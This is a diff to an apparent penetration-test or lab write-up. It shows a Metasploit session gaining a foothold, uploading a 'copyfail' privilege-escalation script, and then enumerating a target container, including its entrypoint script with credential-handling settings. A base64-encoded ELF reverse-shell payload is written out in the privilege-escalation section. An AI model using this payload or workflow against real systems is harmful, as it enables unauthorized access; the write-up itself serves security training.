@@ -1478,6 +1478,7 @@ uid=1002(foothold) gid=1002(foothold) groups=1002(foothold)
 ```
 
 ## Privesc
+##### generating the reverse shell, uploading the copyfail exploit
 ```
 ┌──(kali㉿blue-ops)-[~]
 └─$ msfconsole -q       
@@ -1527,62 +1528,6 @@ Active sessions
 msf > sessions 1
 [*] Starting interaction with 1...
 
-meterpreter > lpwd
-/home/kali
-meterpreter > lls
-Listing Local: /home/kali
-=========================
-
-Mode              Size      Type  Last modified              Name
-----              ----      ----  -------------              ----
-100600/rw-------  0         fil   2026-01-07 18:56:32 -0500  .ICEauthority
-100600/rw-------  53        fil   2026-06-09 08:10:41 -0400  .Xauthority
-100644/rw-r--r--  220       fil   2026-01-07 18:51:49 -0500  .bash_logout
-100644/rw-r--r--  5551      fil   2026-01-07 18:51:49 -0500  .bashrc
-100644/rw-r--r--  3526      fil   2026-01-07 18:51:49 -0500  .bashrc.original
-40775/rwxrwxr-x   4096      dir   2026-02-25 12:40:27 -0500  .cache
-40755/rwxr-xr-x   4096      dir   2026-02-24 11:52:53 -0500  .config
-100644/rw-r--r--  35        fil   2026-01-07 18:56:32 -0500  .dmrc
-100644/rw-r--r--  11759     fil   2026-01-07 18:51:49 -0500  .face
-100644/rw-r--r--  11759     fil   2026-01-07 18:51:49 -0500  .face.icon
-40700/rwx------   4096      dir   2026-01-07 18:56:32 -0500  .gnupg
-40755/rwxr-xr-x   4096      dir   2026-03-12 07:11:10 -0400  .havoc
-40755/rwxr-xr-x   4096      dir   2026-01-07 18:51:49 -0500  .java
-40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  .local
-40775/rwxrwxr-x   4096      dir   2026-02-24 13:22:39 -0500  .mozilla
-40775/rwxrwxr-x   4096      dir   2026-06-09 15:07:47 -0400  .msf4
-40700/rwx------   4096      dir   2026-01-08 08:59:34 -0500  .pki
-100644/rw-r--r--  807       fil   2026-01-07 18:51:49 -0500  .profile
-40700/rwx------   4096      dir   2026-06-08 09:30:36 -0400  .ssh
-100644/rw-r--r--  0         fil   2026-01-07 18:56:52 -0500  .sudo_as_admin_successful
-40755/rwxr-xr-x   4096      dir   2026-02-25 10:17:02 -0500  .vim
-100600/rw-------  14376     fil   2026-03-12 10:15:25 -0400  .viminfo
-100600/rw-------  8265      fil   2026-06-09 15:04:03 -0400  .xsession-errors
-100600/rw-------  4742      fil   2026-06-08 23:54:19 -0400  .xsession-errors.old
-100644/rw-r--r--  336       fil   2026-01-07 18:51:49 -0500  .zprofile
-100600/rw-------  10400     fil   2026-06-09 14:44:04 -0400  .zsh_history
-100644/rw-r--r--  10855     fil   2026-01-07 18:51:49 -0500  .zshrc
-40755/rwxr-xr-x   4096      dir   2026-01-08 10:09:05 -0500  Desktop
-40755/rwxr-xr-x   4096      dir   2026-02-25 10:17:00 -0500  Documents
-40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Downloads
-40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Music
-40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Pictures
-40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Public
-40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Templates
-40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Videos
-100664/rw-rw-r--  5997      fil   2026-06-09 10:00:13 -0400  cf.py
-100664/rw-rw-r--  732       fil   2026-06-09 10:02:11 -0400  cf2.py
-100664/rw-rw-r--  8010      fil   2026-02-25 10:06:20 -0500  changes.patch
-40775/rwxrwxr-x   4096      dir   2026-02-24 12:28:07 -0500  compose_debs
-40775/rwxrwxr-x   4096      dir   2026-02-25 11:07:12 -0500  cs-oc
-100664/rw-rw-r--  16897955  fil   2026-02-24 12:11:18 -0500  cs-oc.tar.bz2
-100644/rw-r--r--  362       fil   2026-01-08 08:36:08 -0500  install_packages.log
-100664/rw-rw-r--  735       fil   2026-06-09 10:26:12 -0400  ligolo-ng.yaml
-100644/rw-r--r--  640       fil   2026-01-08 08:22:27 -0500  packages.microsoft.gpg
-100664/rw-rw-r--  282       fil   2026-06-09 14:55:01 -0400  rev1111
-100400/r--------  399       fil   2026-06-09 10:57:12 -0400  super_secret_key
-100600/rw-------  399       fil   2026-06-09 08:13:38 -0400  super_secret_key.backup
-
 meterpreter > upload cf2.py
 [*] Uploading  : /home/kali/cf2.py -> cf2.py
 [*] Uploaded -1.00 B of 732.00 B (-0.14%): /home/kali/cf2.py -> cf2.py
@@ -1608,7 +1553,7 @@ msf > sessions 2
 meterpreter > 
 
 ```
-
+#### Uploading the reverse shell and executing the copyfail exploit
 ```
 foothold@l42-adv-c2:~$ base64 -d <<< "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQAAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpqB1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCAARXHigyClFIieZqEFpqKlgPBVlIhcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m" > rev
 foothold@l42-adv-c2:~$ chmod +x rev
@@ -1620,3 +1565,88 @@ foothold@l42-adv-c2:~$ python3 cf2.py
 
 ```
 
+## Basic Enumeration
+##### meterpreter > ls -la /
+```
+meterpreter > ls -la /
+Listing: /
+==========
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100755/rwxr-xr-x  0     fil   2026-06-08 23:54:48 -0400  .dockerenv
+040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:04 -0400  bin
+040755/rwxr-xr-x  4096  dir   2026-05-08 12:10:00 -0400  boot
+040755/rwxr-xr-x  340   dir   2026-06-09 12:57:32 -0400  dev
+100775/rwxrwxr-x  1919  fil   2026-06-07 23:27:45 -0400  entrypoint.sh
+040755/rwxr-xr-x  4096  dir   2026-06-08 23:54:48 -0400  etc
+040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:07 -0400  home
+040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:04 -0400  lib
+040755/rwxr-xr-x  4096  dir   2026-05-17 20:00:00 -0400  lib64
+040755/rwxr-xr-x  4096  dir   2026-05-17 20:00:00 -0400  media
+040755/rwxr-xr-x  4096  dir   2026-05-17 20:00:00 -0400  mnt
+040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:09 -0400  opt
+040555/r-xr-xr-x  0     dir   2026-06-09 12:57:32 -0400  proc
+040700/rwx------  4096  dir   2026-06-07 23:31:02 -0400  root
+040755/rwxr-xr-x  4096  dir   2026-06-09 14:48:14 -0400  run
+040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:05 -0400  sbin
+040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:09 -0400  shared
+040755/rwxr-xr-x  4096  dir   2026-05-17 20:00:00 -0400  srv
+040555/r-xr-xr-x  0     dir   2026-06-09 12:57:32 -0400  sys
+041777/rwxrwxrwx  4096  dir   2026-06-09 12:57:36 -0400  tmp
+040755/rwxr-xr-x  4096  dir   2026-05-17 20:00:00 -0400  usr
+040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:05 -0400  var
+```
+##### meterpreter > cat /entrypoint.sh
+```
+meterpreter > cat /entrypoint.sh 
+#!/usr/bin/env bash
+set -euo pipefail
+
+python3 - <<'PY'
+import os
+from pathlib import Path
+import yaml
+
+cfg_path = Path("/opt/c2/config.yaml")
+cfg = yaml.safe_load(cfg_path.read_text(encoding="utf-8"))
+cfg["ingest_token"] = os.getenv("C2_INGEST_TOKEN", cfg.get("ingest_token", "INGEST-3d9f2c"))
+cfg["db"]["host"] = os.getenv("DB_HOST", cfg["db"]["host"])
+cfg["db"]["port"] = int(os.getenv("DB_PORT", cfg["db"]["port"]))
+cfg["db"]["name"] = os.getenv("DB_NAME", cfg["db"]["name"])
+cfg["db"]["user"] = os.getenv("DB_USER", cfg["db"]["user"])
+cfg["db"]["password"] = os.getenv("DB_PASS", cfg["db"]["password"])
+cfg_path.write_text(yaml.safe_dump(cfg, sort_keys=False), encoding="utf-8")
+PY
+
+SSH_PORT="${C2_SSH_PORT:-2222}"
+FOOTHOLD_USER="${C2_FOOTHOLD_USER:-foothold}"
+FOOTHOLD_PUBKEY="${C2_FOOTHOLD_PUBKEY:-}"
+
+if [[ -n "$FOOTHOLD_PUBKEY" ]]; then
+  install -d -m 700 -o "$FOOTHOLD_USER" -g "$FOOTHOLD_USER" "/home/${FOOTHOLD_USER}/.ssh"
+  printf '%s\n' "$FOOTHOLD_PUBKEY" > "/home/${FOOTHOLD_USER}/.ssh/authorized_keys"
+  chown "$FOOTHOLD_USER:$FOOTHOLD_USER" "/home/${FOOTHOLD_USER}/.ssh/authorized_keys"
+  chmod 600 "/home/${FOOTHOLD_USER}/.ssh/authorized_keys"
+fi
+
+if [[ ! -f /etc/ssh/ssh_host_rsa_key ]]; then
+  ssh-keygen -A
+fi
+
+sed -i "s/^#\?Port .*/Port ${SSH_PORT}/" /etc/ssh/sshd_config
+sed -i "s/^#\?PasswordAuthentication .*/PasswordAuthentication no/" /etc/ssh/sshd_config
+sed -i "s/^#\?PermitRootLogin .*/PermitRootLogin no/" /etc/ssh/sshd_config
+if ! grep -q "^AllowUsers ${FOOTHOLD_USER}$" /etc/ssh/sshd_config; then
+  echo "AllowUsers ${FOOTHOLD_USER}" >> /etc/ssh/sshd_config
+fi
+
+mkdir -p /opt/staging/incoming /shared/exfil /shared/corpus /var/log/adv-c2
+touch /var/log/adv-c2/access.log /var/log/adv-c2/error.log /var/log/adv-c2/drain.log
+chown -R c2-app:c2-app /opt/c2 /opt/staging /shared/exfil /shared/corpus /var/log/adv-c2
+
+cron
+nginx
+
+exec /usr/bin/supervisord -c /etc/supervisor/conf.d/c2.conf
+```
